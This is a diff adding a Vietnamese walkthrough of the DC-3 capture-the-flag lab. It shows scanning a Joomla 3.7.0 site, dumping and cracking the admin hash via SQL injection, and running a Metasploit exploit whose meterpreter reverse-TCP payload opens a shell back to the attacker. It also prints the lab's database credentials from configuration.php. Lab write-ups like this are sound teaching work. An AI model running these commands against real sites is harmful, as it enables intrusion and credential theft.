@@ -551,3 +551,982 @@ sudo git -p --help
 Như vậy chúng có hoạt động và bây giờ ta chỉ cần xem chúng ta là ai bằng lệnh `whoami`:
 
 ![alt text](IMG/DC-2/image-31.png)
+
+# DC-3
+
+Tìm địa chỉ IP máy.
+
+```bash
+sudo nmap -T4 -sS -e eth0 172.16.1.0/24
+```
+
+Kết quả:
+
+```txt
+┌──(root㉿kali)-[/home/kali]
+└─# sudo nmap -T4 -sS -e eth0 172.16.1.0/24
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-15 14:20 EDT
+Nmap scan report for 172.16.1.1
+Host is up (0.010s latency).
+All 1000 scanned ports on 172.16.1.1 are in ignored states.
+Not shown: 1000 filtered tcp ports (no-response)
+MAC Address: 00:50:56:C0:00:08 (VMware)
+
+Nmap scan report for 172.16.1.2
+Host is up (0.00010s latency).
+Not shown: 999 closed tcp ports (reset)
+PORT   STATE SERVICE
+53/tcp open  domain
+MAC Address: 00:50:56:F7:5F:EE (VMware)
+
+Nmap scan report for 172.16.1.130
+Host is up (0.00042s latency).
+Not shown: 999 closed tcp ports (reset)
+PORT   STATE SERVICE
+80/tcp open  http
+MAC Address: 00:0C:29:52:CF:61 (VMware)
+
+Nmap scan report for 172.16.1.254
+Host is up (0.000098s latency).
+All 1000 scanned ports on 172.16.1.254 are in ignored states.
+Not shown: 1000 filtered tcp ports (no-response)
+MAC Address: 00:50:56:ED:63:B5 (VMware)
+
+Nmap done: 256 IP addresses (4 hosts up) scanned in 30.83 seconds
+```
+
+Như vậy ở đây ta thấy port 80 mở và biết được địa chỉ của máy là `172.16.1.130`.
+
+![alt text](IMG/DC-3/image.png)
+
+Khi ta sử dụng tiện ích `Wappalyzer` thì ta biết được website mục tiêu đang dùng những công nghệ gì. Từ ảnh ta có thể xác định được:
+
+- CMS: Joomla → Website này nhiều khả năng chạy trên Joomla.
+
+- Ngôn ngữ backend: PHP → Phần xử lý phía server dùng PHP.
+
+- Hệ điều hành server: Ubuntu → Máy chủ web có vẻ đang chạy Ubuntu.
+
+- Web server: Apache HTTP Server 2.4.18 → Dịch vụ web là Apache, phiên bản 2.4.18.
+
+- Thư viện JavaScript: jQuery 1.12.4 và jQuery Migrate 1.4.1
+
+- UI framework: Bootstrap → Giao diện web dùng Bootstrap.
+
+- Font scripts: Google Font API → Web tải font từ Google Fonts.
+
+- Misc: RSS → Có hỗ trợ RSS feed.
+
+Tiếp theo ta sẽ sử dụng `nikto` để quét các lỗ hổng:
+
+```bash
+nikto -host 172.16.1.130
+```
+
+Kết quả:
+
+```txt
+┌──(root㉿kali)-[/home/kali/joomscan]
+└─# nikto -host 172.16.1.130
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          172.16.1.130
++ Target Hostname:    172.16.1.130
++ Target Port:        80
++ Start Time:         2026-03-15 14:48:20 (GMT-4)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.18 (Ubuntu)
++ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ /images: IP address found in the 'location' header. The IP is "127.0.1.1". See: https://portswigger.net/kb/issues/00600300_private-ip-addresses-disclosed
++ /images: The web server may reveal its internal or real IP in the Location header via a request to with HTTP/1.0. The value is "127.0.1.1". See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2000-0649
++ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
++ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
++ /: DEBUG HTTP verb may show server debugging information. See: https://docs.microsoft.com/en-us/visualstudio/debugger/how-to-enable-debugging-for-aspnet-applications?view=vs-2017
++ /index.php?module=ew_filemanager&type=admin&func=manager&pathext=../../../etc: EW FileManager for PostNuke allows arbitrary file retrieval. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2047
++ /administrator/: This might be interesting.
++ /bin/: This might be interesting.
++ /includes/: This might be interesting.
++ /tmp/: This might be interesting.
++ /LICENSE.txt: License file found may identify site software.
++ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
++ /htaccess.txt: Default Joomla! htaccess.txt file found. This should be removed or renamed.
++ /administrator/index.php: Admin login page/section found.
++ 8910 requests: 0 error(s) and 16 item(s) reported on remote host
++ End Time:           2026-03-15 14:48:47 (GMT-4) (27 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+```
+
+Vì chúng ta biết rằng CMS được sử dụng Joomla nên chúng ta sẽ thử tìm ở trên trang github của OWASP để chúng ta sẽ tải xuống `joomscan`:
+
+```bash
+git clone https://github.com/rezasp/joomscan.git
+cd joomscan
+perl joomscan.pl -url 172.16.1.130
+```
+
+```txt
+    ____  _____  _____  __  __  ___   ___    __    _  _
+   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
+  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  (
+  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
+                        (1337.today)
+
+    --=[OWASP JoomScan
+    +---++---==[Version : 0.0.7
+    +---++---==[Update Date : [2018/09/23]
+    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
+    --=[Code name : Self Challenge
+    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP
+
+Processing http://172.16.1.130 ...
+
+
+
+[+] FireWall Detector
+[++] Firewall not detected
+
+[+] Detecting Joomla Version
+[++] Joomla 3.7.0
+
+[+] Core Joomla Vulnerability
+[++] Target Joomla core is not vulnerable
+
+[+] Checking Directory Listing
+[++] directory has directory listing :
+http://172.16.1.130/administrator/components
+http://172.16.1.130/administrator/modules
+http://172.16.1.130/administrator/templates
+http://172.16.1.130/images/banners
+
+
+[+] Checking apache info/status files
+[++] Readable info/status files are not found
+
+[+] admin finder
+[++] Admin page : http://172.16.1.130/administrator/
+
+[+] Checking robots.txt existing
+[++] robots.txt is not found
+
+[+] Finding common backup files name
+[++] Backup files are not found
+
+[+] Finding common log files name
+[++] error log is not found
+
+[+] Checking sensitive config.php.x file
+[++] Readable config files are not found
+
+
+Your Report : reports/172.16.1.130/
+```
+
+Thông qua đây chúng ta biết được rằng phiên bản Joomla được cài đặt là phiên bản `3.7.0`.
+
+Ta sẽ thực hiện quét lại một lần nữa, nhưng lần nay với tùy chọn liệt kê các thành phần 
+
+```bash
+perl joomscan.pl -url 172.16.1.130 -ec
+```
+
+```txt
+
+    ____  _____  _____  __  __  ___   ___    __    _  _
+   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
+  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  (
+  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
+                        (1337.today)
+
+    --=[OWASP JoomScan
+    +---++---==[Version : 0.0.7
+    +---++---==[Update Date : [2018/09/23]
+    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
+    --=[Code name : Self Challenge
+    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP
+
+Processing http://172.16.1.130 ...
+
+
+
+[+] FireWall Detector
+[++] Firewall not detected
+
+[+] Detecting Joomla Version
+[++] Joomla 3.7.0
+
+[+] Core Joomla Vulnerability
+[++] Target Joomla core is not vulnerable
+
+[+] Checking Directory Listing
+[++] directory has directory listing :
+http://172.16.1.130/administrator/components
+http://172.16.1.130/administrator/modules
+http://172.16.1.130/administrator/templates
+http://172.16.1.130/images/banners
+
+
+[+] Checking apache info/status files
+[++] Readable info/status files are not found
+
+[+] admin finder
+[++] Admin page : http://172.16.1.130/administrator/
+
+[+] Checking robots.txt existing
+[++] robots.txt is not found
+
+[+] Finding common backup files name
+[++] Backup files are not found
+
+[+] Finding common log files name
+[++] error log is not found
+
+[+] Checking sensitive config.php.x file
+[++] Readable config files are not found
+
+[+] Enumeration component (com_ajax)
+[++] Name: com_ajax
+Location : http://172.16.1.130/components/com_ajax/
+Directory listing is enabled : http://172.16.1.130/components/com_ajax/
+
+
+[+] Enumeration component (com_banners)
+[++] Name: com_banners
+Location : http://172.16.1.130/components/com_banners/
+Directory listing is enabled : http://172.16.1.130/components/com_banners/
+
+
+[+] Enumeration component (com_biblestudy)
+[++] Name: com_biblestudy
+Location : http://172.16.1.130/components/com_biblestudy/
+Directory listing is enabled : http://172.16.1.130/components/com_biblestudy/
+[!] We found the component "com_biblestudy", but since the component version was not available we cannot ensure that it's vulnerable, please test it yourself.
+Title : Joomla Component com_biblestudy 1.5.0 (id) SQL Injection Exploit
+Reference : https://www.exploit-db.com/exploits/5710
+[!] We found the component "com_biblestudy", but since the component version was not available we cannot ensure that it's vulnerable, please test it yourself.
+Reference : http://www.cvedetails.com/cve/CVE-2018-7317
+Reference : https://www.exploit-db.com/exploits/44159
+Fixed in : 9.1.6
+[!] We found the component "com_biblestudy", but since the component version was not available we cannot ensure that it's vulnerable, please test it yourself.
+Reference : http://www.cvedetails.com/cve/CVE-2018-7316
+Reference : https://www.exploit-db.com/exploits/44164
+Fixed in : 9.1.7
+
+
+[+] Enumeration component (com_contact)
+[++] Name: com_contact
+Location : http://172.16.1.130/components/com_contact/
+Directory listing is enabled : http://172.16.1.130/components/com_contact/
+
+
+[+] Enumeration component (com_content)
+[++] Name: com_content
+Location : http://172.16.1.130/components/com_content/
+Directory listing is enabled : http://172.16.1.130/components/com_content/
+
+
+[+] Enumeration component (com_contenthistory)
+[++] Name: com_contenthistory
+Location : http://172.16.1.130/components/com_contenthistory/
+Directory listing is enabled : http://172.16.1.130/components/com_contenthistory/
+
+
+[+] Enumeration component (com_fields)
+[++] Name: com_fields
+Location : http://172.16.1.130/components/com_fields/
+Directory listing is enabled : http://172.16.1.130/components/com_fields/
+
+
+[+] Enumeration component (com_finder)
+[++] Name: com_finder
+Location : http://172.16.1.130/components/com_finder/
+Directory listing is enabled : http://172.16.1.130/components/com_finder/
+
+
+[+] Enumeration component (com_mailto)
+[++] Name: com_mailto
+Location : http://172.16.1.130/components/com_mailto/
+Directory listing is enabled : http://172.16.1.130/components/com_mailto/
+Installed version : 3.1
+
+
+[+] Enumeration component (com_media)
+[++] Name: com_media
+Location : http://172.16.1.130/components/com_media/
+Directory listing is enabled : http://172.16.1.130/components/com_media/
+
+
+[+] Enumeration component (com_newsfeeds)
+[++] Name: com_newsfeeds
+Location : http://172.16.1.130/components/com_newsfeeds/
+Directory listing is enabled : http://172.16.1.130/components/com_newsfeeds/
+
+
+[+] Enumeration component (com_search)
+[++] Name: com_search
+Location : http://172.16.1.130/components/com_search/
+Directory listing is enabled : http://172.16.1.130/components/com_search/
+
+
+[+] Enumeration component (com_users)
+[++] Name: com_users
+Location : http://172.16.1.130/components/com_users/
+Directory listing is enabled : http://172.16.1.130/components/com_users/
+
+
+[+] Enumeration component (com_wrapper)
+[++] Name: com_wrapper
+Location : http://172.16.1.130/components/com_wrapper/
+Directory listing is enabled : http://172.16.1.130/components/com_wrapper/
+Installed version : 3.1
+
+
+
+Your Report : reports/172.16.1.130/
+```
+
+Bây giờ chúng ta thử search các lỗ hổng của `joomla`:
+
+```bash
+searchsploit joomla
+```
+
+Kết quả tại [đây](FILE/2/tmp1.txt). Quá dài tui không muốn đọc luôn.
+
+Ta sẽ sử dụng msf console sau đó tìm các lỗ hổng tiềm năng:
+
+```bash
+msfconsole
+search joomla
+```
+
+```txt
+msf6 > search joomla
+
+Matching Modules
+================
+
+   #   Name                                                      Disclosure Date  Rank       Check  Description
+   -   ----                                                      ---------------  ----       -----  -----------
+   0   auxiliary/scanner/http/joomla_gallerywd_sqli_scanner      2015-03-30       normal     No     Gallery WD for Joomla! Unauthenticated SQL Injection Scanner
+   1   exploit/unix/webapp/joomla_tinybrowser                    2009-07-22       excellent  Yes    Joomla 1.5.12 TinyBrowser File Upload Code Execution
+   2   auxiliary/scanner/http/joomla_api_improper_access_checks  2023-02-01       normal     Yes    Joomla API Improper Access Checks
+   3   auxiliary/admin/http/joomla_registration_privesc          2016-10-25       normal     Yes    Joomla Account Creation and Privilege Escalation
+   4   exploit/unix/webapp/joomla_akeeba_unserialize             2014-09-29       excellent  Yes    Joomla Akeeba Kickstart Unserialize Remote Code Execution
+   5   auxiliary/scanner/http/joomla_bruteforce_login            .                normal     No     Joomla Bruteforce Login Utility
+   6   exploit/unix/webapp/joomla_comfields_sqli_rce             2017-05-17       excellent  Yes    Joomla Component Fields SQLi Remote Code Execution
+   7   exploit/unix/webapp/joomla_comjce_imgmanager              2012-08-02       excellent  Yes    Joomla Component JCE File Upload Remote Code Execution
+   8   exploit/unix/webapp/joomla_contenthistory_sqli_rce        2015-10-23       excellent  Yes    Joomla Content History SQLi Remote Code Execution
+   9   exploit/multi/http/joomla_http_header_rce                 2015-12-14       excellent  Yes    Joomla HTTP Header Unauthenticated Remote Code Execution
+   10  exploit/unix/webapp/joomla_media_upload_exec              2013-08-01       excellent  Yes    Joomla Media Manager File Upload Vulnerability
+   11  auxiliary/scanner/http/joomla_pages                       .                normal     No     Joomla Page Scanner
+   12  auxiliary/scanner/http/joomla_plugins                     .                normal     No     Joomla Plugins Scanner
+   13  auxiliary/gather/joomla_com_realestatemanager_sqli        2015-10-22       normal     Yes    Joomla Real Estate Manager Component Error-Based SQL Injection
+   14  auxiliary/scanner/http/joomla_version                     .                normal     No     Joomla Version Scanner
+   15  auxiliary/gather/joomla_contenthistory_sqli               2015-10-22       normal     Yes    Joomla com_contenthistory Error-Based SQL Injection
+   16  auxiliary/gather/joomla_weblinks_sqli                     2014-03-02       normal     Yes    Joomla weblinks-categories Unauthenticated SQL Injection Arbitrary File Read
+   17  auxiliary/scanner/http/joomla_ecommercewd_sqli_scanner    2015-03-20       normal     No     Web-Dorado ECommerce WD for Joomla! search_category_id SQL Injection Scanner
+
+
+Interact with a module by name or index. For example info 17, use 17 or use auxiliary/scanner/http/joomla_ecommercewd_sqli_scanner
+```
+
+Và như các bạn thấy thì ở ID thứ 6 có dành cho việc thực thi mã lệnh từ xa. Ta sẽ thử search trên mạng và thấy có kết quả (....). Việc chạy lỗ hổng này thực sự được tiết lộ là một số thông tin rất hữu ích.
+
+```bash
+git clone https://github.com/stefanlucas/Exploit-Joomla.git
+cd Exploit-Joomla
+python joomblah.py http://172.16.1.130
+```
+
+```txt
+┌──(root㉿kali)-[/home/kali/dc-3/Exploit-Joomla]
+└─# python joomblah.py http://172.16.1.130
+/home/kali/dc-3/Exploit-Joomla/joomblah.py:162: SyntaxWarning: invalid escape sequence '\ '
+  |   |   '   _    \     '   _    \                            .---.
+
+    .---.    .-'''-.        .-'''-.
+    |   |   '   _    \     '   _    \                            .---.
+    '---' /   /` '.   \  /   /` '.   \  __  __   ___   /|        |   |            .
+    .---..   |     \  ' .   |     \  ' |  |/  `.'   `. ||        |   |          .'|
+    |   ||   '      |  '|   '      |  '|   .-.  .-.   '||        |   |         <  |
+    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |
+    |   | `.   ` ..' /   `.   ` ..' /  |  |  |  |  |  |||/'__ '. |   | .:--.'.  | | .'''-.
+    |   |    '-...-'`       '-...-'`   |  |  |  |  |  ||:/`  '. '|   |/ |   \ | | |/.'''. \
+    |   |                              |  |  |  |  |  |||     | ||   |`" __ | | |  /    | |
+    |   |                              |__|  |__|  |__|||\    / '|   | .'.''| | | |     | |
+ __.'   '                                              |/'..' / '---'/ /   | |_| |     | |
+|      '                                               '  `'-'`       \ \._,\ '/| '.    | '.
+|____.'                                                                `--'  `" '---'   '---'
+
+ [-] Fetching CSRF token
+ [-] Testing SQLi
+  -  Found table: d8uea_users
+  -  Found table: users
+  -  Extracting users from d8uea_users
+ [$] Found user ['629', 'admin', 'admin', 'freddy@norealaddress.net', '$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu', '', '']
+  -  Extracting sessions from d8uea_session
+  -  Extracting users from users
+  -  Extracting sessions from session
+```
+
+Vì vậy ở dòng này ta phát ra được mã băm ở dòng này là `$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu`. Nhờ chatGPT ta biết được đây là mã hash `bcrypt`.
+
+Ta sẽ thực hiện dictionary trên file `rockyou.txt`.
+
+```txt
+D:\Programs\hashcat\hashcat-7.1.2\hashcat-7.1.2>hashcat.exe -m 3200 _hash.txt rockyou.txt
+hashcat (v7.1.2) starting
+
+Failed to initialize the AMD main driver HIP runtime library. Please install the AMD HIP SDK.
+
+Failed to initialize AMD HIP RTC library. Please install the AMD HIP SDK.
+
+ADL2_Overdrive_Caps(): -8
+
+ADL2_Overdrive_Caps(): -8
+
+ADL2_Overdrive_Caps(): -8
+
+ADL2_Overdrive_Caps(): -8
+
+ADL2_Overdrive_Caps(): -8
+
+OpenCL API (OpenCL 2.1 AMD-APP (3652.0)) - Platform #1 [Advanced Micro Devices, Inc.]
+=====================================================================================
+* Device #01: AMD Radeon(TM) Graphics, 6261/12523 MB (5104 MB allocatable), 6MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 72
+Minimum salt length supported by kernel: 0
+Maximum salt length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Single-Hash
+* Single-Salt
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory allocated for this attack: 538 MB (16078 MB free)
+
+Dictionary cache built:
+* Filename..: rockyou.txt
+* Passwords.: 14344391
+* Bytes.....: 139921497
+* Keyspace..: 14344384
+* Runtime...: 0 secs
+
+$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu:snoopy
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
+Hash.Target......: $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0...lfB1Zu
+Time.Started.....: Mon Mar 16 02:28:02 2026 (1 sec)
+Time.Estimated...: Mon Mar 16 02:28:03 2026 (0 secs)
+Kernel.Feature...: Pure Kernel (password length 0-72 bytes)
+Guess.Base.......: File (rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#01........:      171 H/s (16.73ms) @ Accel:1 Loops:32 Thr:16 Vec:1
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 192/14344384 (0.00%)
+Rejected.........: 0/192 (0.00%)
+Restore.Point....: 96/14344384 (0.00%)
+Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:992-1024
+Candidate.Engine.: Device Generator
+Candidates.#01...: daniela -> november
+Hardware.Mon.#01.: Temp:  0c Fan:  0% Util: 81% Core:2461MHz Mem:2800MHz Bus:16
+
+Started: Mon Mar 16 02:27:39 2026
+Stopped: Mon Mar 16 02:28:05 2026
+```
+
+Chúng ta biết mật khẩu là `snoopy`.
+
+Bây giờ chúng ta truy cập vào trang `172.16.1.130/administrator/index.php`.
+
+![alt text](IMG/DC-3/image-2.png)
+
+Chúng ta đăng nhập được vào:
+
+![alt text](IMG/DC-3/image-3.png)
+
+Tiếp theo chúng ta trở lại `msfconsole`:
+
+```bash
+msf6 > use exploit/unix/webapp/joomla_comfields_sqli_rce
+[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
+msf6 exploit(unix/webapp/joomla_comfields_sqli_rce) >back
+[-] Unknown command: �back. Did you mean back? Run the help command for more details.
+msf6 exploit(unix/webapp/joomla_comfields_sqli_rce) > back
+msf6 > use PAYLOAD php/meterpreter/reverse_tcp
+
+Matching Modules
+================
+
+   #  Name                                      Disclosure Date  Rank    Check  Description
+   -  ----                                      ---------------  ----    -----  -----------
+   0  payload/php/meterpreter/reverse_tcp       .                normal  No     PHP Meterpreter, PHP Reverse TCP Stager
+   1  payload/php/meterpreter/reverse_tcp_uuid  .                normal  No     PHP Meterpreter, PHP Reverse TCP Stager
+
+
+Interact with a module by name or index. For example info 1, use 1 or use payload/php/meterpreter/reverse_tcp_uuid
+
+msf6 > use PAYLOAD php/meterpreter/reverse_tcp
+
+Matching Modules
+================
+
+   #  Name                                      Disclosure Date  Rank    Check  Description
+   -  ----                                      ---------------  ----    -----  -----------
+   0  payload/php/meterpreter/reverse_tcp       .                normal  No     PHP Meterpreter, PHP Reverse TCP Stager
+   1  payload/php/meterpreter/reverse_tcp_uuid  .                normal  No     PHP Meterpreter, PHP Reverse TCP Stager
+
+
+Interact with a module by name or index. For example info 1, use 1 or use payload/php/meterpreter/reverse_tcp_uuid
+
+msf6 > use 1
+msf6 payload(php/meterpreter/reverse_tcp_uuid) > show options
+
+Module options (payload/php/meterpreter/reverse_tcp_uuid):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+View the full module info with the info, or info -d command.
+
+msf6 payload(php/meterpreter/reverse_tcp_uuid) > back
+msf6 > set RHOSTS 172.16.1.130
+RHOSTS => 172.16.1.130
+msf6 > set LHOST eth0
+LHOST => eth0
+msf6 > use exploit/unix/webapp/joomla_comfields_sqli_rce
+[*] Using configured payload php/meterpreter/reverse_tcp
+msf6 exploit(unix/webapp/joomla_comfields_sqli_rce) > run
+[*] Started reverse TCP handler on 172.16.1.129:4444
+[*] 172.16.1.130:80 - Retrieved table prefix [ d8uea ]
+[*] 172.16.1.130:80 - Retrieved cookie [ kmnfk2bhlmu51eo4hn622tkq70 ]
+[*] 172.16.1.130:80 - Retrieved unauthenticated cookie [ 6f12c8b01052b36ca2996b535ee18e8d ]
+[+] 172.16.1.130:80 - Successfully authenticated
+[*] 172.16.1.130:80 - Creating file [ IMJ2Zi.php ]
+[*] 172.16.1.130:80 - Following redirect to [ /administrator/index.php?option=com_templates&view=template&id=503&file=L0lNSjJaaS5waHA%3D ]
+[*] 172.16.1.130:80 - Token [ 94f94c8cdac659e3507441875d87bbee ] retrieved
+[*] 172.16.1.130:80 - Template path [ /templates/beez3/ ] retrieved
+[*] 172.16.1.130:80 - Insert payload into file [ IMJ2Zi.php ]
+[*] 172.16.1.130:80 - Payload data inserted into [ IMJ2Zi.php ]
+[*] 172.16.1.130:80 - Executing payload
+[*] Sending stage (40004 bytes) to 172.16.1.130
+[+] Deleted IMJ2Zi.php
+[*] Meterpreter session 1 opened (172.16.1.129:4444 -> 172.16.1.130:40932) at 2026-03-15 15:47:16 -0400
+```
+
+Tui thực hiện mở Shell và sử dụng lệnh Python sau để giao diện đẹp thuận tiện cho việc khai thác:
+
+```bash
+meterpreter > shell
+Process 1548 created.
+Channel 1 created.
+python3 -c 'import pty; pty.spawn("/bin/sh")'
+$ /bin/bash
+www-data@DC-3:/var/www/html/templates/beez3$
+```
+
+Vậy hiện nay tui đang đăng nhập với tư cách là người dùng www-data và hiện đang ở trong thư mục web:
+
+```txt
+www-data@DC-3:/var/www/html/templates/beez3$ ls -l
+ls -l
+total 200
+-rw-r--r--  1 www-data www-data   2030 Apr 26  2017 component.php
+drwxr-xr-x  2 www-data www-data   4096 Mar 23  2019 css
+-rw-r--r--  1 www-data www-data   8086 Apr 26  2017 error.php
+-rw-r--r--  1 www-data www-data   2019 Apr 26  2017 favicon.ico
+drwxr-xr-x 10 www-data www-data   4096 Mar 23  2019 html
+drwxr-xr-x  5 www-data www-data   4096 Mar 23  2019 images
+-rw-r--r--  1 www-data www-data   8849 Apr 26  2017 index.php
+drwxr-xr-x  2 www-data www-data   4096 Mar 23  2019 javascript
+-rw-r--r--  1 www-data www-data   1446 Apr 26  2017 jsstrings.php
+drwxr-xr-x  3 www-data www-data   4096 Mar 23  2019 language
+-rw-r--r--  1 www-data www-data   4411 Apr 26  2017 templateDetails.xml
+-rw-r--r--  1 www-data www-data 118531 Apr 26  2017 template_preview.png
+-rw-r--r--  1 www-data www-data  21957 Apr 26  2017 template_thumbnail.png
+```
+
+chúng ta cùng nghịch ngợm sau khi vào trong này thì ta phát hiện ra một file rất là hay đó chính là `configuration.php`:
+
+```txt
+www-data@DC-3:/var/www/html/templates/beez3$ ls
+ls
+component.php  html        jsstrings.php         template_thumbnail.png
+css            images      language
+error.php      index.php   templateDetails.xml
+favicon.ico    javascript  template_preview.png
+www-data@DC-3:/var/www/html/templates/beez3$ cd ..
+cd ..
+www-data@DC-3:/var/www/html/templates$ ls
+ls
+beez3  index.html  protostar  system
+www-data@DC-3:/var/www/html/templates$ cd ..
+cd ..
+www-data@DC-3:/var/www/html$ ;s
+;s
+bash: syntax error near unexpected token `;'
+www-data@DC-3:/var/www/html$ ls
+ls
+LICENSE.txt    cli                includes   media            tmp
+README.txt     components         index.php  modules          web.config.txt
+administrator  configuration.php  language   plugins
+bin            htaccess.txt       layouts    robots.txt.dist
+cache          images             libraries  templates
+www-data@DC-3:/var/www/html$ ls -l
+ls -l
+total 108
+-rw-r--r--  1 www-data www-data 18092 Apr 26  2017 LICENSE.txt
+-rw-r--r--  1 www-data www-data  4494 Apr 26  2017 README.txt
+drwxr-xr-x 11 www-data www-data  4096 Apr 26  2017 administrator
+drwxr-xr-x  2 www-data www-data  4096 Apr 26  2017 bin
+drwxr-xr-x  2 www-data www-data  4096 Apr 26  2017 cache
+drwxr-xr-x  2 www-data www-data  4096 Apr 26  2017 cli
+drwxr-xr-x 20 www-data www-data  4096 Mar 23  2019 components
+-rw-r--r--  1 www-data www-data  1946 Mar 23  2019 configuration.php
+-rw-r--r--  1 www-data www-data  3005 Apr 26  2017 htaccess.txt
+drwxr-xr-x  6 www-data www-data  4096 Mar 23  2019 images
+drwxr-xr-x  2 www-data www-data  4096 Apr 26  2017 includes
+-rw-r--r--  1 www-data www-data  1420 Apr 26  2017 index.php
+drwxr-xr-x  4 www-data www-data  4096 Apr 26  2017 language
+drwxr-xr-x  5 www-data www-data  4096 Apr 26  2017 layouts
+drwxr-xr-x 11 www-data www-data  4096 Apr 26  2017 libraries
+drwxr-xr-x 27 www-data www-data  4096 Mar 23  2019 media
+drwxr-xr-x 29 www-data www-data  4096 Mar 23  2019 modules
+drwxr-xr-x 16 www-data www-data  4096 Apr 26  2017 plugins
+-rw-r--r--  1 www-data www-data   836 Apr 26  2017 robots.txt.dist
+drwxr-xr-x  5 www-data www-data  4096 Apr 26  2017 templates
+drwxr-xr-x  5 www-data www-data  4096 Mar 23  2019 tmp
+-rw-r--r--  1 www-data www-data  1690 Apr 26  2017 web.config.txt
+```
+
+Kết quar như sau:
+
+```bash
+cat  configuration.php
+<?php
+class JConfig {
+        public $offline = '0';
+        public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
+        public $display_offline_message = '1';
+        public $offline_image = '';
+        public $sitename = 'DC-3';
+        public $editor = 'tinymce';
+        public $captcha = '0';
+        public $list_limit = '20';
+        public $access = '1';
+        public $debug = '0';
+        public $debug_lang = '0';
+
+        public $dbtype = 'mysqli';
+        public $host = 'localhost';
+        public $user = 'root';
+        public $password = 'squires';
+
+        public $db = 'joomladb';
+        public $dbprefix = 'd8uea_';
+        public $live_site = '';
+        public $secret = '7M6S1HqGMvt1JYkY';
+        public $gzip = '0';
+        public $error_reporting = 'default';
+        public $helpurl = 'https://help.joomla.org/proxy/index.php?keyref=Help{major}{minor}:{keyref}';
+        public $ftp_host = '127.0.0.1';
+        public $ftp_port = '21';
+        public $ftp_user = '';
+        public $ftp_pass = '';
+        public $ftp_root = '';
+        public $ftp_enable = '0';
+        public $offset = 'UTC';
+        public $mailonline = '1';
+        public $mailer = 'mail';
+        public $mailfrom = 'freddy@norealaddress.net';
+        public $fromname = 'DC-3';
+        public $sendmail = '/usr/sbin/sendmail';
+        public $smtpauth = '0';
+        public $smtpuser = '';
+        public $smtppass = '';
+        public $smtphost = 'localhost';
+        public $smtpsecure = 'none';
+        public $smtpport = '25';
+        public $caching = '0';
+        public $cache_handler = 'file';
+        public $cachetime = '15';
+        public $cache_platformprefix = '0';
+        public $MetaDesc = 'A website for DC-3';
+        public $MetaKeys = '';
+        public $MetaTitle = '1';
+        public $MetaAuthor = '1';
+        public $MetaVersion = '0';
+        public $robots = '';
+        public $sef = '1';
+        public $sef_rewrite = '0';
+        public $sef_suffix = '0';
+        public $unicodeslugs = '0';
+        public $feed_limit = '10';
+        public $feed_email = 'none';
+        public $log_path = '/var/www/html/administrator/logs';
+        public $tmp_path = '/var/www/html/tmp';
+        public $lifetime = '15';
+        public $session_handler = 'database';
+        public $shared_session = '0';
+}
+```
+
+Những gì chúng ta thu được ở đây là như sau:
+
+```bash
+        public $dbtype = 'mysqli';
+        public $host = 'localhost';
+        public $user = 'root';
+        public $password = 'squires';
+```
+
+Chúng ta có người dùng root với mật khẩu là `squires`với tư cách là quản trị viên `mysql` cục bộ, nghĩa là bằng việc sử dụng cái này, bạn có thể truy cập vào cơ sở dữ liệu mysql
+
+Bạn có thể truy cập vào cơ sở dữ liệu mysql và cả một vài bảng nhưng mà lại không tìm thấy bất cứ thứ gi hữu ích.
+
+Tôi cũng đã kiểm tra các tệp nhị phân set uid và tôikhông tìm thấy bất kỳ tệp nào. Vì vậy trong bước tiếp theo chúng ta sẽ thực hiện thu thập thông tin cua hệ thống càng nhiều càng tốt và sớm phát hiện ra phiên bản `Linux 4.4.0` đang chạy.
+
+Chúng ta cùng search các exploit của `linux kernel 4.4`:
+
+```bash
